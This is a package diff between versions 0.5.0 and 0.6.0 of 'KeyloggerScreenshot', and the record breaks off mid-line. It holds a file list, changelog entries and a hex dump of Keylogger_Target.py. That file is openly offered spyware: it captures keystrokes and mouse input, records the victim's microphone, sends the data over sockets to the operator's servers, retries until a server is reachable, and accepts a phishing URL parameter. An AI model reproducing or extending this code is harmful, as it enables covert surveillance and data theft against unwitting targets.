# Comparing `tmp/KeyloggerScreenshot-0.5.0.tar.gz` & `tmp/KeyloggerScreenshot-0.6.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "KeyloggerScreenshot-0.5.0.tar", last modified: Fri Jul  7 22:09:59 2023, max compression
+gzip compressed data, was "KeyloggerScreenshot-0.6.0.tar", last modified: Mon Jul 10 20:56:35 2023, max compression
```

## Comparing `KeyloggerScreenshot-0.5.0.tar` & `KeyloggerScreenshot-0.6.0.tar`

### file list

```diff
@@ -1,31 +1,32 @@
-drwxrwxrwx   0        0        0        0 2023-07-07 22:09:59.150402 KeyloggerScreenshot-0.5.0/
--rw-rw-rw-   0        0        0     5081 2023-07-07 20:26:20.000000 KeyloggerScreenshot-0.5.0/CHANGELOG.txt
--rw-rw-rw-   0        0        0    12043 2023-07-07 18:45:06.000000 KeyloggerScreenshot-0.5.0/KLS_start.py
-drwxrwxrwx   0        0        0        0 2023-07-07 22:09:59.098205 KeyloggerScreenshot-0.5.0/KeyloggerScreenshot/
--rw-rw-rw-   0        0        0    15305 2023-07-07 22:06:54.000000 KeyloggerScreenshot-0.5.0/KeyloggerScreenshot/Keylogger_Target.py
--rw-rw-rw-   0        0        0     1917 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.5.0/KeyloggerScreenshot/Port_data.py
--rw-rw-rw-   0        0        0     7494 2023-07-07 18:52:11.000000 KeyloggerScreenshot-0.5.0/KeyloggerScreenshot/Server_keylogger.py
--rw-rw-rw-   0        0        0     2575 2023-07-07 21:53:17.000000 KeyloggerScreenshot-0.5.0/KeyloggerScreenshot/Server_listener.py
--rw-rw-rw-   0        0        0     3982 2023-07-07 21:52:28.000000 KeyloggerScreenshot-0.5.0/KeyloggerScreenshot/Server_photos.py
--rw-rw-rw-   0        0        0     1744 2023-07-04 18:45:54.000000 KeyloggerScreenshot-0.5.0/KeyloggerScreenshot/Server_timer.py
--rw-rw-rw-   0        0        0     8474 2023-06-27 06:05:05.000000 KeyloggerScreenshot-0.5.0/KeyloggerScreenshot/Simulation_code.py
--rw-rw-rw-   0        0        0      284 2023-07-07 18:42:25.000000 KeyloggerScreenshot-0.5.0/KeyloggerScreenshot/__init__.py
-drwxrwxrwx   0        0        0        0 2023-07-07 22:09:59.145312 KeyloggerScreenshot-0.5.0/KeyloggerScreenshot.egg-info/
--rw-rw-rw-   0        0        0    11143 2023-07-07 22:09:58.000000 KeyloggerScreenshot-0.5.0/KeyloggerScreenshot.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      670 2023-07-07 22:09:58.000000 KeyloggerScreenshot-0.5.0/KeyloggerScreenshot.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-07 22:09:58.000000 KeyloggerScreenshot-0.5.0/KeyloggerScreenshot.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       47 2023-07-07 22:09:58.000000 KeyloggerScreenshot-0.5.0/KeyloggerScreenshot.egg-info/requires.txt
--rw-rw-rw-   0        0        0       20 2023-07-07 22:09:58.000000 KeyloggerScreenshot-0.5.0/KeyloggerScreenshot.egg-info/top_level.txt
--rw-rw-rw-   0        0        0     1058 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.5.0/LISCENCE.txt
--rw-rw-rw-   0        0        0       36 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.5.0/MANIFEST.in
--rw-rw-rw-   0        0        0    11143 2023-07-07 22:09:59.146320 KeyloggerScreenshot-0.5.0/PKG-INFO
--rw-rw-rw-   0        0        0     5309 2023-07-07 18:16:46.000000 KeyloggerScreenshot-0.5.0/README.md
--rw-rw-rw-   0        0        0     8506 2023-07-04 19:34:22.000000 KeyloggerScreenshot-0.5.0/Simulation_code.py
--rw-rw-rw-   0        0        0      388 2023-04-27 07:59:51.000000 KeyloggerScreenshot-0.5.0/client.py
--rw-rw-rw-   0        0        0      658 2023-07-07 21:42:29.000000 KeyloggerScreenshot-0.5.0/demon_server.py
--rw-rw-rw-   0        0        0      923 2023-04-27 06:42:15.000000 KeyloggerScreenshot-0.5.0/leo_gui.py
--rw-rw-rw-   0        0        0     1207 2023-03-14 06:32:31.000000 KeyloggerScreenshot-0.5.0/requirements.py
--rw-rw-rw-   0        0        0       42 2023-07-07 22:09:59.150402 KeyloggerScreenshot-0.5.0/setup.cfg
--rw-rw-rw-   0        0        0     1065 2023-07-07 18:16:46.000000 KeyloggerScreenshot-0.5.0/setup.py
--rw-rw-rw-   0        0        0      193 2023-07-07 22:09:52.000000 KeyloggerScreenshot-0.5.0/target.py
--rw-rw-rw-   0        0        0      117 2023-07-07 18:27:45.000000 KeyloggerScreenshot-0.5.0/test.py
+drwxrwxrwx   0        0        0        0 2023-07-10 20:56:35.703147 KeyloggerScreenshot-0.6.0/
+-rw-rw-rw-   0        0        0     5249 2023-07-10 20:24:50.000000 KeyloggerScreenshot-0.6.0/CHANGELOG.txt
+-rw-rw-rw-   0        0        0    12043 2023-07-07 18:45:06.000000 KeyloggerScreenshot-0.6.0/KLS_start.py
+drwxrwxrwx   0        0        0        0 2023-07-10 20:56:35.645530 KeyloggerScreenshot-0.6.0/KeyloggerScreenshot/
+-rw-rw-rw-   0        0        0    15594 2023-07-10 20:19:09.000000 KeyloggerScreenshot-0.6.0/KeyloggerScreenshot/Keylogger_Target.py
+-rw-rw-rw-   0        0        0     1917 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.6.0/KeyloggerScreenshot/Port_data.py
+-rw-rw-rw-   0        0        0     7523 2023-07-10 19:54:06.000000 KeyloggerScreenshot-0.6.0/KeyloggerScreenshot/Server_keylogger.py
+-rw-rw-rw-   0        0        0     2619 2023-07-10 19:42:55.000000 KeyloggerScreenshot-0.6.0/KeyloggerScreenshot/Server_listener.py
+-rw-rw-rw-   0        0        0     3982 2023-07-07 21:52:28.000000 KeyloggerScreenshot-0.6.0/KeyloggerScreenshot/Server_photos.py
+-rw-rw-rw-   0        0        0     1744 2023-07-04 18:45:54.000000 KeyloggerScreenshot-0.6.0/KeyloggerScreenshot/Server_timer.py
+-rw-rw-rw-   0        0        0     8474 2023-06-27 06:05:05.000000 KeyloggerScreenshot-0.6.0/KeyloggerScreenshot/Simulation_code.py
+-rw-rw-rw-   0        0        0      284 2023-07-07 18:42:25.000000 KeyloggerScreenshot-0.6.0/KeyloggerScreenshot/__init__.py
+drwxrwxrwx   0        0        0        0 2023-07-10 20:56:35.694942 KeyloggerScreenshot-0.6.0/KeyloggerScreenshot.egg-info/
+-rw-rw-rw-   0        0        0    12026 2023-07-10 20:56:35.000000 KeyloggerScreenshot-0.6.0/KeyloggerScreenshot.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      680 2023-07-10 20:56:35.000000 KeyloggerScreenshot-0.6.0/KeyloggerScreenshot.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-10 20:56:35.000000 KeyloggerScreenshot-0.6.0/KeyloggerScreenshot.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       57 2023-07-10 20:56:35.000000 KeyloggerScreenshot-0.6.0/KeyloggerScreenshot.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       20 2023-07-10 20:56:35.000000 KeyloggerScreenshot-0.6.0/KeyloggerScreenshot.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0     1058 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.6.0/LISCENCE.txt
+-rw-rw-rw-   0        0        0       36 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.6.0/MANIFEST.in
+-rw-rw-rw-   0        0        0    12026 2023-07-10 20:56:35.694942 KeyloggerScreenshot-0.6.0/PKG-INFO
+-rw-rw-rw-   0        0        0     6024 2023-07-10 20:56:30.000000 KeyloggerScreenshot-0.6.0/README.md
+-rw-rw-rw-   0        0        0     8506 2023-07-04 19:34:22.000000 KeyloggerScreenshot-0.6.0/Simulation_code.py
+-rw-rw-rw-   0        0        0      388 2023-04-27 07:59:51.000000 KeyloggerScreenshot-0.6.0/client.py
+-rw-rw-rw-   0        0        0      655 2023-07-10 20:51:03.000000 KeyloggerScreenshot-0.6.0/demon_server.py
+-rw-rw-rw-   0        0        0      923 2023-04-27 06:42:15.000000 KeyloggerScreenshot-0.6.0/leo_gui.py
+-rw-rw-rw-   0        0        0     1207 2023-03-14 06:32:31.000000 KeyloggerScreenshot-0.6.0/requirements.py
+-rw-rw-rw-   0        0        0       42 2023-07-10 20:56:35.704666 KeyloggerScreenshot-0.6.0/setup.cfg
+-rw-rw-rw-   0        0        0     1078 2023-07-10 20:24:50.000000 KeyloggerScreenshot-0.6.0/setup.py
+-rw-rw-rw-   0        0        0      190 2023-07-10 20:51:03.000000 KeyloggerScreenshot-0.6.0/target.py
+-rw-rw-rw-   0        0        0      158 2023-07-10 20:45:16.000000 KeyloggerScreenshot-0.6.0/test.py
+-rw-rw-rw-   0        0        0       82 2023-07-10 20:35:59.000000 KeyloggerScreenshot-0.6.0/tester.py
```

### Comparing `KeyloggerScreenshot-0.5.0/CHANGELOG.txt` & `KeyloggerScreenshot-0.6.0/CHANGELOG.txt`

 * *Files 6% similar despite different names*

```diff
@@ -184,8 +184,14 @@
 0.5.0 (07/07/2023)
 ------------------
 - All Images will now be sent at once
 - No more random Images
 - More efficient connections
 - New Output
 - New Name of the images ("Image_Target")
-- Data will be stored locally when the server is offline. If the server is online the data will automatically be sent
+- Data will be stored locally when the server is offline. If the server is online the data will automatically be sent
+
+0.6.0 (10/07/2023)
+------------------
+- Everything improved from the previous update
+- Detects if the server is offline
+- Py to exe now works without any issues
```

### Comparing `KeyloggerScreenshot-0.5.0/KLS_start.py` & `KeyloggerScreenshot-0.6.0/KLS_start.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.5.0/KeyloggerScreenshot/Keylogger_Target.py` & `KeyloggerScreenshot-0.6.0/KeyloggerScreenshot/Keylogger_Target.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,957 +1,975 @@
-00000000: 696d 706f 7274 2042 6574 7465 7250 7269  import BetterPri
-00000010: 6e74 696e 670d 0a69 6d70 6f72 7420 7079  nting..import py
-00000020: 7065 7263 6c69 700d 0a66 726f 6d20 7079  perclip..from py
-00000030: 6e70 7574 2069 6d70 6f72 7420 6b65 7962  nput import keyb
-00000040: 6f61 7264 0d0a 6672 6f6d 2070 796e 7075  oard..from pynpu
-00000050: 742e 6d6f 7573 6520 696d 706f 7274 204c  t.mouse import L
-00000060: 6973 7465 6e65 720d 0a69 6d70 6f72 7420  istener..import 
-00000070: 7469 6d65 0d0a 696d 706f 7274 2073 7973  time..import sys
-00000080: 0d0a 696d 706f 7274 2073 6f63 6b65 740d  ..import socket.
-00000090: 0a69 6d70 6f72 7420 7079 6175 746f 6775  .import pyautogu
-000000a0: 6920 6173 2070 670d 0a69 6d70 6f72 7420  i as pg..import 
-000000b0: 6f73 0d0a 696d 706f 7274 2070 7961 7564  os..import pyaud
-000000c0: 696f 0d0a 696d 706f 7274 2074 6872 6561  io..import threa
-000000d0: 6469 6e67 0d0a 696d 706f 7274 2072 6571  ding..import req
-000000e0: 7565 7374 730d 0a69 6d70 6f72 7420 7765  uests..import we
-000000f0: 6262 726f 7773 6572 0d0a 6672 6f6d 2064  bbrowser..from d
-00000100: 6174 6574 696d 6520 696d 706f 7274 2064  atetime import d
-00000110: 6174 6574 696d 650d 0a0d 0a0d 0a63 6c61  atetime......cla
-00000120: 7373 204b 6579 6c6f 6767 6572 5461 7267  ss KeyloggerTarg
-00000130: 6574 3a0d 0a20 2020 2064 6566 205f 5f69  et:..    def __i
-00000140: 6e69 745f 5f28 7365 6c66 2c20 6970 5f6f  nit__(self, ip_o
+00000000: 696d 706f 7274 2070 7970 6572 636c 6970  import pyperclip
+00000010: 0d0a 6672 6f6d 2070 796e 7075 7420 696d  ..from pynput im
+00000020: 706f 7274 206b 6579 626f 6172 640d 0a66  port keyboard..f
+00000030: 726f 6d20 7079 6e70 7574 2e6d 6f75 7365  rom pynput.mouse
+00000040: 2069 6d70 6f72 7420 4c69 7374 656e 6572   import Listener
+00000050: 0d0a 696d 706f 7274 2074 696d 650d 0a69  ..import time..i
+00000060: 6d70 6f72 7420 7379 730d 0a69 6d70 6f72  mport sys..impor
+00000070: 7420 736f 636b 6574 0d0a 696d 706f 7274  t socket..import
+00000080: 2070 7961 7574 6f67 7569 2061 7320 7067   pyautogui as pg
+00000090: 0d0a 696d 706f 7274 206f 730d 0a69 6d70  ..import os..imp
+000000a0: 6f72 7420 7079 6175 6469 6f0d 0a69 6d70  ort pyaudio..imp
+000000b0: 6f72 7420 7468 7265 6164 696e 670d 0a69  ort threading..i
+000000c0: 6d70 6f72 7420 7265 7175 6573 7473 0d0a  mport requests..
+000000d0: 696d 706f 7274 2077 6562 6272 6f77 7365  import webbrowse
+000000e0: 720d 0a66 726f 6d20 6461 7465 7469 6d65  r..from datetime
+000000f0: 2069 6d70 6f72 7420 6461 7465 7469 6d65   import datetime
+00000100: 0d0a 0d0a 0d0a 636c 6173 7320 4b65 796c  ......class Keyl
+00000110: 6f67 6765 7254 6172 6765 743a 0d0a 2020  oggerTarget:..  
+00000120: 2020 6465 6620 5f5f 696e 6974 5f5f 2873    def __init__(s
+00000130: 656c 662c 2069 705f 6f66 5f73 6572 7665  elf, ip_of_serve
+00000140: 725f 7068 6f74 6f73 2c20 706f 7274 5f6f  r_photos, port_o
 00000150: 665f 7365 7276 6572 5f70 686f 746f 732c  f_server_photos,
-00000160: 2070 6f72 745f 6f66 5f73 6572 7665 725f   port_of_server_
-00000170: 7068 6f74 6f73 2c20 6970 5f6f 665f 7365  photos, ip_of_se
-00000180: 7276 6572 5f6b 6579 6c6f 6767 6572 5f64  rver_keylogger_d
-00000190: 6174 612c 0d0a 2020 2020 2020 2020 2020  ata,..          
-000001a0: 2020 2020 2020 2070 6f72 745f 6f66 5f73         port_of_s
-000001b0: 6572 7665 725f 6b65 796c 6f67 6765 725f  erver_keylogger_
-000001c0: 6461 7461 2c20 6970 5f6f 665f 7365 7276  data, ip_of_serv
-000001d0: 6572 5f6c 6973 7465 6e65 722c 2070 6f72  er_listener, por
-000001e0: 745f 6f66 5f73 6572 7665 725f 6c69 7374  t_of_server_list
-000001f0: 656e 6572 2c20 6970 5f6f 665f 7469 6d65  ener, ip_of_time
-00000200: 722c 0d0a 2020 2020 2020 2020 2020 2020  r,..            
-00000210: 2020 2020 2070 6f72 745f 6f66 5f74 696d       port_of_tim
-00000220: 6572 2c20 6475 7261 7469 6f6e 5f69 6e5f  er, duration_in_
-00000230: 7365 636f 6e64 733d 3630 2c20 7068 6973  seconds=60, phis
-00000240: 6869 6e67 5f77 6562 3d4e 6f6e 6529 3a0d  hing_web=None):.
-00000250: 0a20 2020 2020 2020 2023 2022 6475 7261  .        # "dura
-00000260: 7469 6f6e 5f69 6e5f 7365 636f 6e64 7322  tion_in_seconds"
-00000270: 2074 656c 6c73 2074 6865 2070 726f 6772   tells the progr
-00000280: 616d 6d20 686f 7720 6c6f 6e67 2069 7420  amm how long it 
-00000290: 7368 6f75 6c64 206c 6173 7420 7468 6520  should last the 
-000002a0: 6465 6661 756c 7420 7469 6d65 2069 7320  default time is 
-000002b0: 3630 2073 6563 6f6e 6473 2074 6861 7427  60 seconds that'
-000002c0: 7320 3120 4d69 6e75 7465 0d0a 2020 2020  s 1 Minute..    
-000002d0: 2020 2020 6173 7365 7274 2064 7572 6174      assert durat
-000002e0: 696f 6e5f 696e 5f73 6563 6f6e 6473 203e  ion_in_seconds >
-000002f0: 3d20 3630 2c20 6622 7b64 7572 6174 696f  = 60, f"{duratio
-00000300: 6e5f 696e 5f73 6563 6f6e 6473 7d20 6973  n_in_seconds} is
-00000310: 206e 6f74 2067 7265 6174 6572 2061 6e64   not greater and
-00000320: 206e 6f74 2065 7175 616c 2074 6f20 3630   not equal to 60
-00000330: 220d 0a20 2020 2020 2020 2023 2022 6475  "..        # "du
-00000340: 7261 7469 6f6e 5f69 6e5f 7365 636f 6e64  ration_in_second
-00000350: 7322 2073 686f 756c 6420 616c 7761 7973  s" should always
-00000360: 2062 6520 6269 6767 6572 2074 6861 6e20   be bigger than 
-00000370: 3630 2073 6563 6f6e 6473 0d0a 0d0a 2020  60 seconds....  
-00000380: 2020 2020 2020 7365 6c66 2e69 705f 7068        self.ip_ph
-00000390: 6f74 6f73 203d 2069 705f 6f66 5f73 6572  otos = ip_of_ser
-000003a0: 7665 725f 7068 6f74 6f73 0d0a 2020 2020  ver_photos..    
-000003b0: 2020 2020 7365 6c66 2e70 6f72 745f 7068      self.port_ph
-000003c0: 6f74 6f73 203d 2070 6f72 745f 6f66 5f73  otos = port_of_s
-000003d0: 6572 7665 725f 7068 6f74 6f73 0d0a 2020  erver_photos..  
-000003e0: 2020 2020 2020 7365 6c66 2e69 705f 6b65        self.ip_ke
-000003f0: 796c 6f67 6765 7220 3d20 6970 5f6f 665f  ylogger = ip_of_
-00000400: 7365 7276 6572 5f6b 6579 6c6f 6767 6572  server_keylogger
-00000410: 5f64 6174 610d 0a20 2020 2020 2020 2073  _data..        s
-00000420: 656c 662e 706f 7274 5f6b 6579 6c6f 6767  elf.port_keylogg
-00000430: 6572 203d 2070 6f72 745f 6f66 5f73 6572  er = port_of_ser
-00000440: 7665 725f 6b65 796c 6f67 6765 725f 6461  ver_keylogger_da
-00000450: 7461 0d0a 2020 2020 2020 2020 7365 6c66  ta..        self
-00000460: 2e69 705f 6c69 7374 656e 6572 203d 2069  .ip_listener = i
-00000470: 705f 6f66 5f73 6572 7665 725f 6c69 7374  p_of_server_list
-00000480: 656e 6572 0d0a 2020 2020 2020 2020 7365  ener..        se
-00000490: 6c66 2e70 6f72 745f 6c69 7374 656e 6572  lf.port_listener
-000004a0: 203d 2070 6f72 745f 6f66 5f73 6572 7665   = port_of_serve
-000004b0: 725f 6c69 7374 656e 6572 0d0a 2020 2020  r_listener..    
-000004c0: 2020 2020 7365 6c66 2e64 7572 6174 696f      self.duratio
-000004d0: 6e20 3d20 6475 7261 7469 6f6e 5f69 6e5f  n = duration_in_
-000004e0: 7365 636f 6e64 730d 0a20 2020 2020 2020  seconds..       
-000004f0: 2073 656c 662e 6970 5f74 696d 6572 203d   self.ip_timer =
-00000500: 2069 705f 6f66 5f74 696d 6572 0d0a 2020   ip_of_timer..  
-00000510: 2020 2020 2020 7365 6c66 2e70 6f72 745f        self.port_
-00000520: 7469 6d65 7220 3d20 706f 7274 5f6f 665f  timer = port_of_
-00000530: 7469 6d65 720d 0a20 2020 2020 2020 2073  timer..        s
-00000540: 656c 662e 7068 6973 6869 6e67 203d 2070  elf.phishing = p
-00000550: 6869 7368 696e 675f 7765 620d 0a0d 0a20  hishing_web.... 
-00000560: 2020 2020 2020 2073 656c 662e 6368 6563         self.chec
-00000570: 6b20 3d20 5b5d 0d0a 2020 2020 2020 2020  k = []..        
-00000580: 7365 6c66 2e63 6170 7320 3d20 4661 6c73  self.caps = Fals
-00000590: 650d 0a20 2020 2020 2020 2073 656c 662e  e..        self.
-000005a0: 7269 6368 7469 6765 5f6c 6973 7465 203d  richtige_liste =
-000005b0: 205b 5d0d 0a20 2020 2020 2020 2073 656c   []..        sel
-000005c0: 662e 636f 6f72 6469 6e61 7465 7320 3d20  f.coordinates = 
-000005d0: 5b5d 0d0a 2020 2020 2020 2020 7365 6c66  []..        self
-000005e0: 2e77 6f72 6420 3d20 4e6f 6e65 0d0a 2020  .word = None..  
-000005f0: 2020 2020 2020 7365 6c66 2e73 6563 6f6e        self.secon
-00000600: 6473 203d 205b 5d0d 0a20 2020 2020 2020  ds = []..       
-00000610: 2073 656c 662e 6672 616d 6573 203d 204e   self.frames = N
-00000620: 6f6e 650d 0a20 2020 2020 2020 2073 656c  one..        sel
-00000630: 662e 616d 6f75 6e74 203d 2030 0d0a 2020  f.amount = 0..  
-00000640: 2020 2020 2020 7365 6c66 2e69 6d61 6765        self.image
-00000650: 735f 6461 7461 203d 207b 7d0d 0a0d 0a20  s_data = {}.... 
-00000660: 2020 2064 6566 2064 6174 656e 5f61 7566     def daten_auf
-00000670: 6e65 6865 6d65 6e28 7365 6c66 293a 0d0a  nehemen(self):..
-00000680: 2020 2020 2020 2020 6c69 7374 656e 696e          listenin
-00000690: 675f 6461 7461 203d 2073 6f63 6b65 742e  g_data = socket.
-000006a0: 736f 636b 6574 2873 6f63 6b65 742e 4146  socket(socket.AF
-000006b0: 5f49 4e45 542c 2073 6f63 6b65 742e 534f  _INET, socket.SO
-000006c0: 434b 5f53 5452 4541 4d29 0d0a 2020 2020  CK_STREAM)..    
-000006d0: 2020 2020 6c69 7374 656e 696e 675f 6461      listening_da
-000006e0: 7461 2e63 6f6e 6e65 6374 2828 7365 6c66  ta.connect((self
-000006f0: 2e69 705f 6c69 7374 656e 6572 2c20 7365  .ip_listener, se
-00000700: 6c66 2e70 6f72 745f 6c69 7374 656e 6572  lf.port_listener
-00000710: 2929 0d0a 2020 2020 2020 2020 7472 793a  ))..        try:
-00000720: 0d0a 2020 2020 2020 2020 2020 2020 666f  ..            fo
-00000730: 726d 6174 203d 2070 7961 7564 696f 2e70  rmat = pyaudio.p
-00000740: 6149 6e74 3136 0d0a 2020 2020 2020 2020  aInt16..        
-00000750: 2020 2020 6368 616e 6e65 6c73 203d 2032      channels = 2
-00000760: 0d0a 2020 2020 2020 2020 2020 2020 7261  ..            ra
-00000770: 7465 203d 2034 3431 3030 0d0a 2020 2020  te = 44100..    
-00000780: 2020 2020 2020 2020 6368 756e 6b20 3d20          chunk = 
-00000790: 3130 3234 0d0a 2020 2020 2020 2020 2020  1024..          
-000007a0: 2020 7365 636f 6e64 7320 3d20 7365 6c66    seconds = self
-000007b0: 2e64 7572 6174 696f 6e20 2b20 310d 0a0d  .duration + 1...
-000007c0: 0a20 2020 2020 2020 2020 2020 2061 7564  .            aud
-000007d0: 696f 203d 2070 7961 7564 696f 2e50 7941  io = pyaudio.PyA
-000007e0: 7564 696f 2829 0d0a 0d0a 2020 2020 2020  udio()....      
-000007f0: 2020 2020 2020 2320 7374 6172 7420 5265        # start Re
-00000800: 636f 7264 696e 670d 0a20 2020 2020 2020  cording..       
-00000810: 2020 2020 2073 7472 6561 6d20 3d20 6175       stream = au
-00000820: 6469 6f2e 6f70 656e 2866 6f72 6d61 743d  dio.open(format=
-00000830: 666f 726d 6174 2c20 6368 616e 6e65 6c73  format, channels
-00000840: 3d63 6861 6e6e 656c 732c 0d0a 2020 2020  =channels,..    
-00000850: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00000860: 2020 2020 2020 2020 2020 2020 7261 7465              rate
-00000870: 3d72 6174 652c 2069 6e70 7574 3d54 7275  =rate, input=Tru
-00000880: 652c 0d0a 2020 2020 2020 2020 2020 2020  e,..            
-00000890: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000008a0: 2020 2020 6672 616d 6573 5f70 6572 5f62      frames_per_b
-000008b0: 7566 6665 723d 6368 756e 6b29 0d0a 2020  uffer=chunk)..  
-000008c0: 2020 2020 2020 2020 2020 2320 7072 696e            # prin
-000008d0: 7428 2272 6563 6f72 6469 6e67 2e2e 2e22  t("recording..."
-000008e0: 290d 0a20 2020 2020 2020 2020 2020 2066  )..            f
-000008f0: 7261 6d65 7320 3d20 5b5d 0d0a 0d0a 2020  rames = []....  
-00000900: 2020 2020 2020 2020 2020 666f 7220 6920            for i 
-00000910: 696e 2072 616e 6765 2830 2c20 696e 7428  in range(0, int(
-00000920: 7261 7465 202f 2063 6875 6e6b 202a 2073  rate / chunk * s
-00000930: 6563 6f6e 6473 2929 3a0d 0a20 2020 2020  econds)):..     
-00000940: 2020 2020 2020 2020 2020 2064 6174 6120             data 
-00000950: 3d20 7374 7265 616d 2e72 6561 6428 6368  = stream.read(ch
-00000960: 756e 6b29 0d0a 2020 2020 2020 2020 2020  unk)..          
-00000970: 2020 2020 2020 6672 616d 6573 2e61 7070        frames.app
-00000980: 656e 6428 6461 7461 290d 0a0d 0a20 2020  end(data)....   
-00000990: 2020 2020 2020 2020 2023 2070 7269 6e74           # print
-000009a0: 2822 6669 6e69 7368 6564 2072 6563 6f72  ("finished recor
-000009b0: 6469 6e67 2229 0d0a 0d0a 2020 2020 2020  ding")....      
-000009c0: 2020 2020 2020 2320 7374 6f70 2052 6563        # stop Rec
-000009d0: 6f72 6469 6e67 0d0a 2020 2020 2020 2020  ording..        
-000009e0: 2020 2020 7374 7265 616d 2e73 746f 705f      stream.stop_
-000009f0: 7374 7265 616d 2829 0d0a 2020 2020 2020  stream()..      
-00000a00: 2020 2020 2020 7374 7265 616d 2e63 6c6f        stream.clo
-00000a10: 7365 2829 0d0a 2020 2020 2020 2020 2020  se()..          
-00000a20: 2020 6175 6469 6f2e 7465 726d 696e 6174    audio.terminat
-00000a30: 6528 290d 0a0d 0a20 2020 2020 2020 2020  e()....         
-00000a40: 2020 2023 2043 6f6e 6e65 6374 696f 6e20     # Connection 
-00000a50: 7769 7468 2053 6572 7665 724c 6973 7465  with ServerListe
-00000a60: 6e65 720d 0a0d 0a20 2020 2020 2020 2020  ner....         
-00000a70: 2020 2073 656c 662e 6672 616d 6573 203d     self.frames =
-00000a80: 2073 7472 2866 7261 6d65 7329 0d0a 2020   str(frames)..  
-00000a90: 2020 2020 2020 2020 2020 2320 4966 2074            # If t
-00000aa0: 6865 2073 6572 7665 7220 6973 2074 6865  he server is the
-00000ab0: 2064 6f77 6e20 6974 2077 696c 6c20 7374   down it will st
-00000ac0: 6f72 6520 7468 6520 6461 7461 206c 6f63  ore the data loc
-00000ad0: 616c 6c79 2061 6e64 2077 6169 7420 756e  ally and wait un
-00000ae0: 7469 6c20 7468 6520 7365 7276 6572 2069  til the server i
-00000af0: 7320 6176 6169 6c61 626c 6520 6167 6169  s available agai
-00000b00: 6e2e 0d0a 2020 2020 2020 2020 2020 2020  n...            
-00000b10: 7768 696c 6520 5472 7565 3a0d 0a20 2020  while True:..   
-00000b20: 2020 2020 2020 2020 2020 2020 2074 7279               try
-00000b30: 3a0d 0a20 2020 2020 2020 2020 2020 2020  :..             
-00000b40: 2020 2020 2020 206c 6973 7465 6e69 6e67         listening
-00000b50: 5f64 6174 612e 7365 6e64 2873 656c 662e  _data.send(self.
-00000b60: 6672 616d 6573 2e65 6e63 6f64 6528 2929  frames.encode())
-00000b70: 0d0a 2020 2020 2020 2020 2020 2020 2020  ..              
-00000b80: 2020 2020 2020 6272 6561 6b0d 0a20 2020        break..   
-00000b90: 2020 2020 2020 2020 2020 2020 2065 7863               exc
-00000ba0: 6570 743a 0d0a 2020 2020 2020 2020 2020  ept:..          
-00000bb0: 2020 2020 2020 2020 2020 636f 6e74 696e            contin
-00000bc0: 7565 0d0a 0d0a 0d0a 2020 2020 2020 2020  ue......        
-00000bd0: 6578 6365 7074 204f 5345 7272 6f72 3a0d  except OSError:.
-00000be0: 0a20 2020 2020 2020 2020 2020 2070 7269  .            pri
-00000bf0: 6e74 2822 4e4f 204d 4943 524f 5048 4f4e  nt("NO MICROPHON
-00000c00: 4520 4445 5445 4354 4544 204f 5220 4d49  E DETECTED OR MI
-00000c10: 4352 4f50 484f 4e45 2053 4554 5449 4e47  CROPHONE SETTING
-00000c20: 2044 4953 4142 4c45 4422 290d 0a20 2020   DISABLED")..   
-00000c30: 2020 2020 2020 2020 206e 6f5f 6d69 6372           no_micr
-00000c40: 6f66 6f6e 203d 2022 5448 4520 5441 5247  ofon = "THE TARG
-00000c50: 4554 2048 4153 204e 4f20 4d49 4352 4f50  ET HAS NO MICROP
-00000c60: 484f 4e45 204f 4e22 0d0a 0d0a 2020 2020  HONE ON"....    
-00000c70: 2020 2020 2020 2020 2320 4966 2074 6865          # If the
-00000c80: 2073 6572 7665 7220 6973 2074 6865 2064   server is the d
-00000c90: 6f77 6e20 6974 2077 696c 6c20 7374 6f72  own it will stor
-00000ca0: 6520 7468 6520 6461 7461 206c 6f63 616c  e the data local
-00000cb0: 6c79 2061 6e64 2077 6169 7420 756e 7469  ly and wait unti
-00000cc0: 6c20 7468 6520 7365 7276 6572 2069 7320  l the server is 
-00000cd0: 6176 6169 6c61 626c 6520 6167 6169 6e2e  available again.
-00000ce0: 0d0a 2020 2020 2020 2020 2020 2020 7768  ..            wh
-00000cf0: 696c 6520 5472 7565 3a0d 0a20 2020 2020  ile True:..     
-00000d00: 2020 2020 2020 2020 2020 2074 7279 3a0d             try:.
-00000d10: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-00000d20: 2020 2020 206c 6973 7465 6e69 6e67 5f64       listening_d
-00000d30: 6174 612e 7365 6e64 286e 6f5f 6d69 6372  ata.send(no_micr
-00000d40: 6f66 6f6e 2e65 6e63 6f64 6528 2929 0d0a  ofon.encode())..
-00000d50: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00000d60: 2020 2020 6272 6561 6b0d 0a20 2020 2020      break..     
-00000d70: 2020 2020 2020 2020 2020 2065 7863 6570             excep
-00000d80: 743a 0d0a 2020 2020 2020 2020 2020 2020  t:..            
-00000d90: 2020 2020 2020 2020 636f 6e74 696e 7565          continue
-00000da0: 0d0a 2020 2020 2020 2020 2020 2020 2320  ..            # 
-00000db0: 5365 6e64 7320 6461 7461 2074 6f20 5365  Sends data to Se
-00000dc0: 7276 6572 4c69 7374 656e 6572 0d0a 0d0a  rverListener....
-00000dd0: 2020 2020 6465 6620 636c 6965 6e74 2873      def client(s
-00000de0: 656c 6629 3a0d 0a20 2020 2020 2020 2073  elf):..        s
-00000df0: 656c 662e 616d 6f75 6e74 202b 3d20 310d  elf.amount += 1.
-00000e00: 0a20 2020 2020 2020 2023 2054 6869 7320  .        # This 
